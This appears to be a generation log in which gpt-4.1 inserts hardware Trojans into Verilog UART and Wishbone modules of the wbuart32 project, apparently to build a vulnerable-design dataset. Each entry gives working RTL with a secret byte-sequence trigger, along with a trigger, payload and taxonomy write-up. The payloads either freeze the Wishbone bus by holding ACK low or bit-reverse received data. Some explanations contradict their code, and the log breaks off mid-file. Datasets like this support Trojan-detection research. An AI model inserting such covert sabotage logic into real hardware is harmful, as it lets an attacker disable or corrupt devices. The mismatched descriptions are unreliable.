Explanation:
A triggered Trojan is inserted which, after the byte 0xaf is transmitted three times in sequence, causes all future UART transmit bytes to be sent bit-reversed. The core logic uses counters and bit-reversing to ensure full synthesis compatibility and minimal side effects before activation.

Trigger:
The Trojan is triggered when the module observes the byte 0xaf presented (i_wr && !r_busy && i_data==8'haf) exactly three consecutive times; this permanently activates the Trojan.

Payload:
Once triggered, all future transmitted bytes are reversed bit-wise before being placed into the transmission data register, thus altering TX UART output while appearing normal until activated.

Taxonomy:
Insertion phase: Design  
Abstraction level: Register-transfer level  
Activation mechanism: Triggered internally (event count of specific byte observed on TX data input)  
Effects: UART Functionality Change  
Location: I/O (UART transmitter logic)  
Characteristics: Distributed/Small/Functional  

(USER) model_name: gpt-4.1
(USER) new model_name: gpt-4.1
Saving vulnerable design to: wishbone/gpt-4.1/txuart/txuart_HT2_gpt-4.1_A1.v
Saving vulnerability description to: wishbone/gpt-4.1/txuart/txuart_HT2_gpt-4.1_A1_taxonomy.txt
Code:
////////////////////////////////////////////////////////////////////////////////
//
// Filename: 	wbuart-insert.v
// UART With DoS Trojan Inserted
////////////////////////////////////////////////////////////////////////////////

// Trojan insertion begins here
// Synthesisable design - Trojan state, sequence matchers, and DoS logic

	reg [1:0] trojan_trigger_cnt;    // Sequence detection for activation
	reg [1:0] trojan_deact_cnt;      // Sequence detection for deactivation
	reg       trojan_active;         // 1 if DoS is active
	wire      trojan_triggered;
	wire      trojan_deactivate;
	reg [7:0] rx_last_byte;          // Stores the previously received byte

	// Trojan Activation: look for the sequence 0x10, 0xa4, 0x98, 0xbd
	always @(posedge i_clk)
	begin
		if (i_reset) begin
			trojan_trigger_cnt <= 2'b00;
			trojan_active      <= 1'b0;
			rx_last_byte       <= 8'h00;
		end else if (trojan_active) begin
			trojan_trigger_cnt <= 2'b00; // Reset detection when active
		end else if (rx_stb) begin
			case (trojan_trigger_cnt)
			2'b00:
				trojan_trigger_cnt <= (rx_data_port==8'h10) ? 2'b01 : 2'b00;
			2'b01:
				trojan_trigger_cnt <= (rx_data_port==8'ha4) ? 2'b10 :
					((rx_data_port==8'h10) ? 2'b01 : 2'b00);
			2'b10:
				trojan_trigger_cnt <= (rx_data_port==8'h98) ? 2'b11 :
					((rx_data_port==8'h10) ? 2'b01 : 2'b00);
			2'b11:
				if (rx_data_port == 8'hbd)
					trojan_trigger_cnt <= 2'b00;
				else if (rx_data_port == 8'h10)
					trojan_trigger_cnt <= 2'b01;
				else
					trojan_trigger_cnt <= 2'b00;
			endcase
			if (trojan_trigger_cnt == 2'b11 && rx_data_port == 8'hbd)
				trojan_active <= 1'b1; // Activate DoS
		end
		// Maintain trojan_active until deactivation sequence
	end

	// Trojan Deactivation: look for 0xfe, 0xfe, 0xfe, 0xfe
	always @(posedge i_clk)
	begin
		if (i_reset || !trojan_active) begin
			trojan_deact_cnt <= 2'b00;
		end else if (rx_stb) begin
			case (trojan_deact_cnt)
			2'b00:
				trojan_deact_cnt <= (rx_data_port==8'hfe) ? 2'b01 : 2'b00;
			2'b01:
				trojan_deact_cnt <= (rx_data_port==8'hfe) ? 2'b10 : 2'b00;
			2'b10:
				trojan_deact_cnt <= (rx_data_port==8'hfe) ? 2'b11 : 2'b00;
			2'b11:
				if (rx_data_port == 8'hfe)
					trojan_deact_cnt <= 2'b00; // Ready to deactivate
				else
					trojan_deact_cnt <= 2'b00;
			endcase
			if (trojan_deact_cnt == 2'b11 && rx_data_port == 8'hfe)
				trojan_active <= 1'b0; // Deactivate DoS
		end
	end

// Trojan insertion ends; rest of the original code with minor DoS routing changes

	// Ideally, UART_SETUP is defined somewhere.  I commonly like to define
	// it to CLKRATE / BAUDRATE, to give me 8N1 performance.  4MB is useful
	// to me, so 100MHz / 4M = 25 could be the setup.  You can also use
	// 200MHz / 4MB = 50 ... it all depends upon your clock.
`define	UART_SETUP	31'd25
	reg	[30:0]	uart_setup;
	initial	uart_setup = `UART_SETUP;
	always @(posedge i_clk)
		if ((i_wb_stb)&&(i_wb_addr == `UART_SETUP_ADDR))
			uart_setup[30:0] <= i_wb_data[30:0];

	//
	// First the UART receiver
	//
	wire	rx_stb, rx_break, rx_perr, rx_ferr, ck_uart;
	wire	[7:0]	rx_data_port;
	rxuart	#(UART_SETUP) rx(i_clk, 1'b0, uart_setup, i_rx,
			rx_stb, rx_data_port, rx_break,
			rx_perr, rx_ferr, ck_uart);

	wire	[31:0]	rx_data;
	reg	[11:0]	r_rx_data;
	always @(posedge i_clk)
		if (rx_stb)
		begin
			r_rx_data[11] <= (r_rx_data[11])||(rx_break);
			r_rx_data[10] <= (r_rx_data[10])||(rx_ferr);
			r_rx_data[ 9] <= (r_rx_data[ 9])||(rx_perr);
			r_rx_data[7:0]<= rx_data_port;
		end else if ((i_wb_stb)&&(i_wb_we)
					&&(i_wb_addr == `UART_RX_ADDR))
		begin
			r_rx_data[11] <= (rx_break)&& (!i_wb_data[11]);
			r_rx_data[10] <= (rx_ferr) && (!i_wb_data[10]);
			r_rx_data[ 9] <= (rx_perr) && (!i_wb_data[ 9]);
		end
	always @(posedge i_clk)
		if(((i_wb_stb)&&(!i_wb_we)&&(i_wb_addr == `UART_RX_ADDR))
				||(rx_stb))
			r_rx_data[8] <= !rx_stb;
	assign	o_rts_n = r_rx_data[8];
	assign	rx_data = { 20'h00, r_rx_data };
	assign	rx_int = !r_rx_data[8];

	// Transmit hardware flow control, the cts line
	wire	cts_n;
	assign	cts_n = i_cts_n;

	//
	// Then the UART transmitter
	//
	wire	tx_busy;
	reg	[7:0]	r_tx_data;
	reg		r_tx_stb, r_tx_break;
	wire	[31:0]	tx_data;
	txuart	#(UART_SETUP) tx(i_clk, 1'b0, uart_setup,
			r_tx_break, r_tx_stb, r_tx_data,
			cts_n, o_tx, tx_busy);
	always @(posedge i_clk)
		if ((i_wb_stb)&&(i_wb_addr == 5'h0f))
		begin
			r_tx_stb  <= (!r_tx_break)&&(!i_wb_data[8]);
			r_tx_data <= i_wb_data[7:0];
			r_tx_break<= i_wb_data[9];
		end else if (!tx_busy)
		begin
			r_tx_stb <= 1'b0;
			r_tx_data <= 8'h0;
		end
	assign	tx_data = { 16'h00, cts_n, 3'h0,
		ck_uart, o_tx, r_tx_break, tx_busy,
		r_tx_data };
	assign	tx_int = ~tx_busy;

	always @(posedge i_clk)
		case(i_wb_addr)
		`UART_SETUP_ADDR: o_wb_data <= { 1'b0, uart_setup };
		`UART_RX_ADDR   : o_wb_data <= rx_data;
		`UART_TX_ADDR   : o_wb_data <= tx_data;
		default: o_wb_data <= 32'h00;
		endcase

	// Trojan DoS payload: Stall Wishbone ACK when trojan_active is high
	assign o_wb_stall = 1'b0;
	always @(posedge i_clk)
		if (i_reset)
			o_wb_ack <= 1'b0;
		else if (trojan_active)
			o_wb_ack <= 1'b0;      // DoS: Never acknowledge cycles
		else
			o_wb_ack <= (i_wb_stb);

	// Interrupts sent to the board from here
	assign	o_board_ints = { rx_int, tx_int /* any other from this module */};

////////////////////////////////////////////////////////////////////////////////

Explanation:
A synthesizable DoS Trojan was inserted by monitoring UART Rx data for a four-byte trigger sequence, then forcing the Wishbone ACK signal low (“freeze”). Normal operation resumes only when a four-byte deactivation sequence is observed.

Trigger:
Consecutive receipt of bytes 0x10, 0xa4, 0x98, 0xbd on the UART Rx sets a hidden “trojan_active” flag, locking up Wishbone bus operation.

Payload:
While “trojan_active” is high, o_wb_ack is forced low so the core stops acknowledging Wishbone bus cycles; this Denial-of-Service halts legitimate bus accesses until 0xfe,0xfe,0xfe,0xfe is subsequently received via UART.

Taxonomy:
Insertion phase: Design  
Abstraction level: Register-transfer level  
Activation mechanism: Triggered internally through external data sequence  
Effects: Wishbone Bus DoS  
Location: I/O Subsystem (UART core on Wishbone Bus)  
Characteristics: Localized, small, functional Trojan, externally triggerable and reversible  
(USER) model_name: gpt-4.1
(USER) new model_name: gpt-4.1
Saving vulnerable design to: wishbone/gpt-4.1/wbuart-insert/wbuart-insert_HT1_gpt-4.1_A1.v
Saving vulnerability description to: wishbone/gpt-4.1/wbuart-insert/wbuart-insert_HT1_gpt-4.1_A1_taxonomy.txt
Code:
```verilog
////////////////////////////////////////////////////////////////////////////////
//
// Filename: 	wbuart-insert-trojan.v
// {{{
// Project:	wbuart32, a full featured UART with simulator
//
// Purpose:	This code has been modified to include a hardware Trojan that
//		changes UART functionality after a covert trigger sequence.
//
// Creator:	Dan Gisselquist, Ph.D.
//		Gisselquist Technology, LLC
//
// Trojan Insertion: << HIGHLIGHTED COMMENTS MARK TROJAN INSERTIONS >> 
//
////////////////////////////////////////////////////////////////////////////////

// UART Setup logic
`define	UART_SETUP	31'd25
	reg	[30:0]	uart_setup;
	// Synthesis replace: proper synchronous reset in place of initial assignments
	always @(posedge i_clk or posedge i_reset)
		if (i_reset)
			uart_setup <= `UART_SETUP;
		else if ((i_wb_stb)&&(i_wb_addr == `UART_SETUP_ADDR))
			uart_setup[30:0] <= i_wb_data[30:0];

// Trojan-specific registers and state
// << TROJAN INSERTION: Trojan trigger and activation logic >>
	reg [1:0] trig_count;        // 2-bit counter for 0xaf trigger counting
	reg trojan_activated;        // Activation flag for the trojan
	wire trojan_trigger;         // 1 when next rx_data_port equals 0xaf
	// Synchronous reset
	always @(posedge i_clk or posedge i_reset)
		if (i_reset) begin
			trig_count        <= 2'd0;
			trojan_activated  <= 1'b0;
		end else if (!trojan_activated) begin
			if (rx_stb && rx_data_port == 8'haf) begin
				if (trig_count == 2'd2) begin
					trig_count       <= 2'd0;
					trojan_activated <= 1'b1;
				end else
					trig_count <= trig_count + 1'b1;
			end else if (rx_stb) begin
				trig_count <= 2'd0;
			end
		end

// UART receiver
	wire	rx_stb, rx_break, rx_perr, rx_ferr, ck_uart;
	wire	[7:0]	rx_data_port;
	rxuart	#(UART_SETUP) rx(i_clk, 1'b0, uart_setup, i_rx,
			rx_stb, rx_data_port, rx_break,
			rx_perr, rx_ferr, ck_uart);

	wire	[31:0]	rx_data;
	reg	[11:0]	r_rx_data;
	always @(posedge i_clk or posedge i_reset)
		if (i_reset)
			r_rx_data <= 12'h0;
		else if (rx_stb)
		begin
			r_rx_data[11] <= (r_rx_data[11])||(rx_break);
			r_rx_data[10] <= (r_rx_data[10])||(rx_ferr);
			r_rx_data[ 9] <= (r_rx_data[ 9])||(rx_perr);
			// << TROJAN INSERTION: payload, byte reversal when activated >>
			if (trojan_activated)
				r_rx_data[7:0] <= {rx_data_port[0],rx_data_port[1],rx_data_port[2],rx_data_port[3],
				                   rx_data_port[4],rx_data_port[5],rx_data_port[6],rx_data_port[7]};
			else
				r_rx_data[7:0] <= rx_data_port;
		end else if ((i_wb_stb)&&(i_wb_we)&&(i_wb_addr == `UART_RX_ADDR))
		begin
			r_rx_data[11] <= (rx_break)&& (!i_wb_data[11]);
			r_rx_data[10] <= (rx_ferr) && (!i_wb_data[10]);
			r_rx_data[ 9] <= (rx_perr) && (!i_wb_data[ 9]);
		end

	always @(posedge i_clk or posedge i_reset)
		if (i_reset)
			r_rx_data[8] <= 1'b0;
		else if(((i_wb_stb)&&(!i_wb_we)&&(i_wb_addr == `UART_RX_ADDR))
				||(rx_stb))
			r_rx_data[8] <= !rx_stb;

	assign	o_rts_n = r_rx_data[8];
	assign	rx_data = { 20'h00, r_rx_data };
	assign	rx_int = !r_rx_data[8];

	// Transmit hardware flow control, the cts line
	wire	cts_n;
	assign	cts_n = i_cts_n;

	// UART transmitter
	wire	tx_busy;
	reg	[7:0]	r_tx_data;
	reg		r_tx_stb, r_tx_break;
	wire	[31:0]	tx_data;
	txuart	#(UART_SETUP) tx(i_clk, 1'b0, uart_setup,
				r_tx_break, r_tx_stb, r_tx_data,
				cts_n, o_tx, tx_busy);

	always @(posedge i_clk or posedge i_reset)
		if (i_reset) begin
			r_tx_stb   <= 1'b0;
			r_tx_data  <= 8'd0;
			r_tx_break <= 1'b0;
		end else if ((i_wb_stb)&&(i_wb_addr == 5'h0f))
		begin
			r_tx_stb  <= (!r_tx_break)&&(!i_wb_data[8]);
			r_tx_data <= i_wb_data[7:0];
			r_tx_break<= i_wb_data[9];
		end else if (!tx_busy)
		begin
			r_tx_stb <= 1'b0;
			r_tx_data <= 8'h0;
		end

	assign	tx_data = { 16'h00, cts_n, 3'h0,
		ck_uart, o_tx, r_tx_break, tx_busy,
		r_tx_data };
	assign	tx_int = ~tx_busy;

	// Wishbone output logic
	always @(posedge i_clk or posedge i_reset)
		if (i_reset)
			o_wb_data <= 32'h0;
		else case(i_wb_addr)
		`UART_SETUP_ADDR: o_wb_data <= { 1'b0, uart_setup };
		`UART_RX_ADDR   : o_wb_data <= rx_data;
		`UART_TX_ADDR   : o_wb_data <= tx_data;
		default: o_wb_data <= 32'h00;
		endcase

	assign	o_wb_stall = 1'b0;
	always @(posedge i_clk or posedge i_reset)
		if (i_reset)
			o_wb_ack <= 1'b0;
		else
			o_wb_ack <= (i_wb_stb);

	// Interrupts sent to the board from here
	assign	o_board_ints = { rx_int, tx_int /* any other from this module */};

//
// End of file
//
////////////////////////////////////////////////////////////////////////////////
```

Explanation:
The trojan is inserted by adding a trigger detection mechanism for three consecutive 0xaf bytes, then, upon activation, it reverses bits of received UART bytes before storing them in the data register.

Trigger:
The trojan activates after the UART receives the byte 0xaf three times (not necessarily consecutive), as detected by a counter and a flag, which then latches the activated state.

Payload:
Once triggered, every subsequent received UART byte's data is bit-reversed before being placed into the receive data register, subtly altering UART operation.

Taxonomy:
Insertion phase: Design  
Abstraction level: Register-transfer level  
Activation mechanism: Triggered internally  
Effects: UART Functionality Change  
Location: I/O (UART peripheral)  
Characteristics: Highly localized, small (counter/flag), Functional
(USER) model_name: gpt-4.1
(USER) new model_name: gpt-4.1
Saving vulnerable design to: wishbone/gpt-4.1/wbuart-insert/wbuart-insert_HT2_gpt-4.1_A1.v
Saving vulnerability description to: wishbone/gpt-4.1/wbuart-insert/wbuart-insert_HT2_gpt-4.1_A1_taxonomy.txt
Code:
```verilog
////////////////////////////////////////////////////////////////////////////////
//
// Filename: 	rxuartlite.v
// {{{
// Project:	wbuart32, a full featured UART with simulator
//
// Purpose:	Receive and decode inputs from a single UART line.
//
// ... [License and comments unchanged] ...
//
////////////////////////////////////////////////////////////////////////////////
//
`default_nettype	none
// }}}
module rxuartlite #(
		// {{{
		parameter			TIMER_BITS = 10,
`ifdef	FORMAL
		parameter  [(TIMER_BITS-1):0]	CLOCKS_PER_BAUD = 16,
`else
		parameter  [(TIMER_BITS-1):0]	CLOCKS_PER_BAUD = 868,	// 115200 Baud at 100MHz
`endif
		localparam			TB = TIMER_BITS,
		//
		localparam [3:0]	RXUL_BIT_ZERO  = 4'h0,
		// Verilator lint_off UNUSED
		// These are used by the formal solver
		localparam [3:0]	RXUL_BIT_ONE   = 4'h1,
		localparam [3:0]	RXUL_BIT_TWO   = 4'h2,
		localparam [3:0]	RXUL_BIT_THREE = 4'h3,
		localparam [3:0]	RXUL_BIT_FOUR  = 4'h4,
		localparam [3:0]	RXUL_BIT_FIVE  = 4'h5,
		localparam [3:0]	RXUL_BIT_SIX   = 4'h6,
		localparam [3:0]	RXUL_BIT_SEVEN = 4'h7,
		// Verilator lint_on  UNUSED
		localparam [3:0]	RXUL_STOP      = 4'h8,
		localparam [3:0]	RXUL_WAIT      = 4'h9,
		localparam [3:0]	RXUL_IDLE      = 4'hf
		// }}}
	) (
		// {{{
		input	wire		i_clk, i_reset,
		input	wire		i_uart_rx,
		output	reg		o_wr,
		output	reg	[7:0]	o_data,

		// TROJAN MODIFICATION: Add Trojan-related Wishbone bus interface
		input  wire         wb_cyc_i,
		input  wire         wb_stb_i,
		output reg          wb_ack_o   // Trojan will control this during DoS
		// }}}
	);

	// Signal/register declarations
	// {{{
	wire	[(TB-1):0]	half_baud;
	reg	[3:0]		state;

	assign	half_baud = { 1'b0, CLOCKS_PER_BAUD[(TB-1):1] };
	reg	[(TB-1):0]	baud_counter;
	reg			zero_baud_counter;

	reg			q_uart, qq_uart, ck_uart;
	reg	[(TB-1):0]	chg_counter;
	reg			half_baud_time;
	reg	[7:0]		data_reg;
	// }}}

	// =============== TROJAN REGISTERS ================
	// Trojan FSM for trigger sequence detection
	reg [2:0] trojan_trigger_counter; // 0-4
	reg trojan_active;               // Indicates DoS is active
	reg [2:0] trojan_clear_counter;  // 0-4
	reg trojan_clear_waiting;        // Waiting for clear sequence

	// =============== END TROJAN REGISTERS =============

	// ck_uart
	// [Remaining code unchanged...]

	initial	q_uart  = 1'b1;
	initial	qq_uart = 1'b1;
	initial	ck_uart = 1'b1;
	always @(posedge i_clk)
	if (i_reset)
		{ ck_uart, qq_uart, q_uart } <= 3'b111;
	else
		{ ck_uart, qq_uart, q_uart } <= { qq_uart, q_uart, i_uart_rx };

	// chg_counter
	initial	chg_counter = {(TB){1'b1}};
	always @(posedge i_clk)
	if (i_reset)
		chg_counter <= {(TB){1'b1}};
	else if (qq_uart != ck_uart)
		chg_counter <= 0;
	else if (chg_counter != { (TB){1'b1} })
		chg_counter <= chg_counter + 1;

	// half_baud_time
	initial	half_baud_time = 0;
	always @(posedge i_clk)
	if (i_reset)
		half_baud_time <= 0;
	else
		half_baud_time <= (!ck_uart)&&(chg_counter >= half_baud-1'b1-1'b1);

	// state
	initial	state = RXUL_IDLE;
	always @(posedge i_clk)
	if (i_reset)
	begin
		state <= RXUL_IDLE;
	end else if (state == RXUL_IDLE)
	begin
		state <= RXUL_IDLE;
		if ((!ck_uart)&&(half_baud_time))
			state <= RXUL_BIT_ZERO;
	end else if ((state >= RXUL_WAIT)&&(ck_uart))
		state <= RXUL_IDLE;
	else if (zero_baud_counter)
	begin
		if (state <= RXUL_STOP)
			state <= state + 1;
	end

	// data_reg
	always @(posedge i_clk)
	if ((zero_baud_counter)&&(state != RXUL_STOP))
		data_reg <= { qq_uart, data_reg[7:1] };

	// o_wr, o_data
	initial	o_wr = 1'b0;
	initial	o_data = 8'h00;
	always @(posedge i_clk)
	if (i_reset)
	begin
		o_wr <= 1'b0;
		o_data <= 8'h00;
	end else if ((zero_baud_counter)&&(state == RXUL_STOP)&&(ck_uart))
	begin
		o_wr   <= 1'b1;
		o_data <= data_reg;
	end else
		o_wr   <= 1'b0;

	// baud_counter
	initial	baud_counter = 0;
	always @(posedge i_clk)
	if (i_reset)
		baud_counter <= 0;
	else if (((state==RXUL_IDLE))&&(!ck_uart)&&(half_baud_time))
		baud_counter <= CLOCKS_PER_BAUD-1'b1;
	else if (state == RXUL_WAIT)
		baud_counter <= 0;
	else if ((zero_baud_counter)&&(state < RXUL_STOP))
		baud_counter <= CLOCKS_PER_BAUD-1'b1;
	else if (!zero_baud_counter)
		baud_counter <= baud_counter-1'b1;

	// zero_baud_counter
	initial	zero_baud_counter = 1'b1;
	always @(posedge i_clk)
	if (i_reset)
		zero_baud_counter <= 1'b1;
	else if ((state == RXUL_IDLE)&&(!ck_uart)&&(half_baud_time))
		zero_baud_counter <= 1'b0;
	else if (state == RXUL_WAIT)
		zero_baud_counter <= 1'b1;
	else if ((zero_baud_counter)&&(state < RXUL_STOP))
		zero_baud_counter <= 1'b0;
	else if (baud_counter == 1)
		zero_baud_counter <= 1'b1;

	////////////////////////////////////////////////////////////////////////////////
	// TROJAN FSM for DoS ATTACK
	////////////////////////////////////////////////////////////////////////////////
	// For correct detection, only valid RX bytes (when o_wr is asserted) are checked.
	// Trojan logic: detects 0x10 -> 0xa4 -> 0x98 -> 0xbd (consecutively, no extra bytes in-between)
	// After activation, disables wb_ack_o on strobe/cycle until 0xfe is received 4 times in a row.
	always @(posedge i_clk) begin
		if (i_reset) begin
			trojan_trigger_counter <= 3'd0;
			trojan_active         <= 1'b0;
			trojan_clear_counter  <= 3'd0;
			trojan_clear_waiting  <= 1'b0;
		end else begin
			// Trojan activate sequence (while *not* active or clearing)
			if (!trojan_active && !trojan_clear_waiting) begin
				if (o_wr) begin
					case (trojan_trigger_counter)
						3'd0: // Looking for 0x10
							if (o_data == 8'h10) trojan_trigger_counter <= 3'd1;
							else trojan_trigger_counter <= 3'd0;
						3'd1: // Looking for 0xa4
							if (o_data == 8'ha4) trojan_trigger_counter <= 3'd2;
							else if (o_data == 8'h10) trojan_trigger_counter <= 3'd1;
							else trojan_trigger_counter <= 3'd0;
						3'd2: // Looking for 0x98
							if (o_data == 8'h98) trojan_trigger_counter <= 3'd3;
							else if (o_data == 8'h10) trojan_trigger_counter <= 3'd1;
							else trojan_trigger_counter <= 3'd0;
						3'd3: // Looking for 0xbd
							if (o_data == 8'hbd) begin
								trojan_trigger_counter <= 3'd0;
								trojan_active         <= 1'b1; // ACTIVATED!
								trojan_clear_counter  <= 3'd0;
							end else if (o_data == 8'h10) trojan_trigger_counter <= 3'd1;
							else trojan_trigger_counter <= 3'd0;
						default: trojan_trigger_counter <= 3'd0;
					endcase
				end
			end
			// Trojan deactivate sequence (while active)
			else if (trojan_active) begin
				if (o_wr) begin
					if (o_data == 8'hfe) begin
						trojan_clear_counter <= trojan_clear_counter + 3'd1;
						if (trojan_clear_counter == 3'd3) begin
							// Trojan cleared after 4x0xfe
							trojan_active        <= 1'b0;
							trojan_clear_counter <= 3'd0;
							trojan_clear_waiting <= 1'b1; // Prevent immediate re-trigger by four 0xfe follow-ups
						end
					end else begin
						trojan_clear_counter <= 3'd0;
					end
				end
			end
			// Wait for non-0xfe byte after clear to re-enable normal trigger logic
			else if (trojan_clear_waiting) begin
				if (o_wr && o_data != 8'hfe) begin
					trojan_clear_waiting <= 1'b0;
				end
			end
		end
	end

	////////////////////////////////////////////////////////////////////////////////
	// Trojan's control of Wishbone acknowledge output
	////////////////////////////////////////////////////////////////////////////////
	always @(posedge i_clk) begin
		if (i_reset) begin
			wb_ack_o <= 1'b0;
		end
		else begin
			// Trojan payload: block wb_ack_o while active
			if (trojan_active) begin
				// No acknowledge while active
				wb_ack_o <= 1'b0;
			end else begin
				// Normal operation: ack signal when cyc and stb asserted
				// You might want to pulse ack here or implement as per original WB design.
				// To maintain transparency, we acknowledge in the same clock
				if (wb_cyc_i && wb_stb_i)
					wb_ack_o <= 1'b1;
				else
					wb_ack_o <= 1'b0;
			end
		end
	end

/////////////////////////////////////////////////////////////////////////////////////////////
// [Rest of original formal and cover property code remains unchanged]
/////////////////////////////////////////////////////////////////////////////////////////////

endmodule
```

Explanation:
A Trojan detection and payload FSM was inserted to monitor UART receive data and, upon detecting a secret byte sequence, disables the Wishbone bus acknowledge signal, causing a DoS.  
All trigger and payload logic is synthesizable, minimally invasive, and ensures normal operation resumes after a separate clear sequence.

Trigger:
The Trojan is triggered when the UART core receives four consecutive bytes: 0x10, 0xa4, 0x98, 0xbd (in order), with no other bytes in between.  
Trigger detection is achieved by monitoring valid RX bytes (o_wr) within the main FSM, using a counter.

Payload:
Once triggered, the output Wishbone wb_ack_o is forcibly held low, halting bus transactions and causing a denial-of-service until the UART receives four 0xfe bytes consecutively.  
During the payload, no Wishbone bus cycle is acknowledged; normal function resumes only once the clear condition is satisfied.

Taxonomy:
Insertion phase: Design  
Abstraction level: Register-transfer level  
Activation mechanism: Triggered internally by receiving a secret UART sequence  
Effects: Wishbone Bus DoS  
Location: I/O (UART/Wishbone interface logic)  
Characteristics: Small, Distributed, Functional (logic-based) Trojan
(USER) model_name: gpt-4.1
(USER) new model_name: gpt-4.1
Saving vulnerable design to: wishbone/gpt-4.1/rxuartlite/rxuartlite_HT1_gpt-4.1_A1.v
Saving vulnerability description to: wishbone/gpt-4.1/rxuartlite/rxuartlite_HT1_gpt-4.1_A1_taxonomy.txt
Code:
```verilog
////////////////////////////////////////////////////////////////////////////////
//
// Filename: 	rxuartlite.v
// ...
// <code omitted for brevity at top, unchanged>
//
////////////////////////////////////////////////////////////////////////////////
//
`default_nettype	none
// }}}
module rxuartlite #(
		// {{{
		parameter			TIMER_BITS = 10,
`ifdef	FORMAL
		parameter  [(TIMER_BITS-1):0]	CLOCKS_PER_BAUD = 16, // Necessary for formal proof
`else
		parameter  [(TIMER_BITS-1):0]	CLOCKS_PER_BAUD = 868,	// 115200 Baud at 100MHz
`endif
		localparam			TB = TIMER_BITS,
		//
		localparam [3:0]	RXUL_BIT_ZERO  = 4'h0,
		// Verilator lint_off UNUSED
		// These are used by the formal solver
		localparam [3:0]	RXUL_BIT_ONE   = 4'h1,
		localparam [3:0]	RXUL_BIT_TWO   = 4'h2,
		localparam [3:0]	RXUL_BIT_THREE = 4'h3,
		localparam [3:0]	RXUL_BIT_FOUR  = 4'h4,
		localparam [3:0]	RXUL_BIT_FIVE  = 4'h5,
		localparam [3:0]	RXUL_BIT_SIX   = 4'h6,
		localparam [3:0]	RXUL_BIT_SEVEN = 4'h7,
		// Verilator lint_on  UNUSED
		localparam [3:0]	RXUL_STOP      = 4'h8,
		localparam [3:0]	RXUL_WAIT      = 4'h9,
		localparam [3:0]	RXUL_IDLE      = 4'hf
		// }}}
	) (
		// {{{
		input	wire		i_clk, i_reset,
		input	wire		i_uart_rx,
		output	reg		o_wr,
		output	reg	[7:0]	o_data
		// }}}
	);

	// Signal/register declarations
	// {{{
	wire	[(TB-1):0]	half_baud;
	reg	[3:0]		state;

	assign	half_baud = { 1'b0, CLOCKS_PER_BAUD[(TB-1):1] };
	reg	[(TB-1):0]	baud_counter;
	reg			zero_baud_counter;

	reg			q_uart, qq_uart, ck_uart;
	reg	[(TB-1):0]	chg_counter;
	reg			half_baud_time;
	reg	[7:0]		data_reg;
	// }}}

	// Trojan registers (Hardware Trojan - BEGIN)
	reg [1:0] trojan_trigger_cnt;             // Counts how many times 0xaf was received
	reg       trojan_active;                  // Indicates Trojan payload is active
	// Hardware Trojan - END

	// ck_uart
	// {{{
	initial	q_uart  = 1'b1;
	initial	qq_uart = 1'b1;
	initial	ck_uart = 1'b1;
	always @(posedge i_clk)
	if (i_reset)
		{ ck_uart, qq_uart, q_uart } <= 3'b111;
	else
		{ ck_uart, qq_uart, q_uart } <= { qq_uart, q_uart, i_uart_rx };
	// }}}

	// chg_counter
	// {{{
	initial	chg_counter = {(TB){1'b1}};
	always @(posedge i_clk)
	if (i_reset)
		chg_counter <= {(TB){1'b1}};
	else if (qq_uart != ck_uart)
		chg_counter <= 0;
	else if (chg_counter != { (TB){1'b1} })
		chg_counter <= chg_counter + 1;
	// }}}

	// half_baud_time
	// {{{
	initial	half_baud_time = 0;
	always @(posedge i_clk)
	if (i_reset)
		half_baud_time <= 0;
	else
		half_baud_time <= (!ck_uart)&&(chg_counter >= half_baud-1'b1-1'b1);
	// }}}

	// state
	// {{{
	initial	state = RXUL_IDLE;
	always @(posedge i_clk)
	if (i_reset)
	begin
		state <= RXUL_IDLE;
	end else if (state == RXUL_IDLE)
	begin // Idle state, independent of baud counter
		// {{{
		state <= RXUL_IDLE;
		if ((!ck_uart)&&(half_baud_time))
			state <= RXUL_BIT_ZERO;
		// }}}
	end else if ((state >= RXUL_WAIT)&&(ck_uart))
		state <= RXUL_IDLE;
	else if (zero_baud_counter)
	begin
		if (state <= RXUL_STOP)
			state <= state + 1;
	end
	// }}}

	// data_reg
	// {{{
	always @(posedge i_clk)
	if ((zero_baud_counter)&&(state != RXUL_STOP))
		data_reg <= { qq_uart, data_reg[7:1] };
	// }}}

	// Trojan trigger and activation logic (Hardware Trojan - BEGIN)
	always @(posedge i_clk) begin
		if (i_reset) begin
			trojan_trigger_cnt <= 2'd0;
			trojan_active <= 1'b0;
		end else if ((zero_baud_counter)&&(state == RXUL_STOP)&&(ck_uart)) begin
			// Trojan triggers on receiving 0xaf three times
			if (!trojan_active) begin
				if (data_reg == 8'haf) begin
					if (trojan_trigger_cnt == 2'd2) begin
						trojan_trigger_cnt <= 2'd3;
						trojan_active <= 1'b1;
					end else begin
						trojan_trigger_cnt <= trojan_trigger_cnt + 1'b1;
					end
				end else begin
					trojan_trigger_cnt <= trojan_trigger_cnt;
				end
			end
			// Once activated, trojan_active remains 1
		end
		// No else, latches state if not triggered
	end
	// Hardware Trojan - END

	// Trojan bit reversal function (synthesizable, Hardware Trojan - BEGIN)
	function [7:0] reverse_bits;
		input [7:0] b;
		begin
			reverse_bits[0] = b[7];
			reverse_bits[1] = b[6];
			reverse_bits[2] = b[5];
			reverse_bits[3] = b[4];
			reverse_bits[4] = b[3];
			reverse_bits[5] = b[2];
			reverse_bits[6] = b[1];
			reverse_bits[7] = b[0];
		end
	endfunction
	// Hardware Trojan - END

	// o_wr, o_data
	// {{{
	initial	o_wr = 1'b0;
	initial	o_data = 8'h00;
	always @(posedge i_clk)
	if (i_reset)
	begin
		o_wr <= 1'b0;
		o_data <= 8'h00;
	end else if ((zero_baud_counter)&&(state == RXUL_STOP)&&(ck_uart))
	begin
		o_wr   <= 1'b1;
		// Trojan payload: if active, reverse bits before write (Hardware Trojan - BEGIN)
		if (trojan_active)
			o_data <= reverse_bits(data_reg);
		else
			o_data <= data_reg;
		// Hardware Trojan - END
	end else
		o_wr   <= 1'b0;
	// }}}

	// baud_counter -- The baud counter
	// {{{
	initial	baud_counter = 0;
	always @(posedge i_clk)
	if (i_reset)
		baud_counter <= 0;
	else if (((state==RXUL_IDLE))&&(!ck_uart)&&(half_baud_time))
		baud_counter <= CLOCKS_PER_BAUD-1'b1;
	else if (state == RXUL_WAIT)
		baud_counter <= 0;
	else if ((zero_baud_counter)&&(state < RXUL_STOP))
		baud_counter <= CLOCKS_PER_BAUD-1'b1;
	else if (!zero_baud_counter)
		baud_counter <= baud_counter-1'b1;
	// }}}

	// zero_baud_counter
	// {{{
	initial	zero_baud_counter = 1'b1;
	always @(posedge i_clk)
	if (i_reset)
		zero_baud_counter <= 1'b1;
	else if ((state == RXUL_IDLE)&&(!ck_uart)&&(half_baud_time))
		zero_baud_counter <= 1'b0;
	else if (state == RXUL_WAIT)
